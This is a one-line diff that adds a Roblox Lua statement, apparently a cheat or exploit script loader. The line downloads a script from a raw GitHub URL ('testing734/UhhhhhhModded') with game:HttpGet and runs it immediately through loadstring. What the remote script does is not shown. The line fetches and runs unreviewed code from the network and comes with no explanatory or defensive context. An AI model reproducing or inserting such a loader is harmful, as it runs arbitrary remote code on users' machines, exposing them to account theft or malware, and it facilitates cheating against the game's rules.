@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/testing734/UhhhhhhModded/refs/heads/main/betabetafork"))()
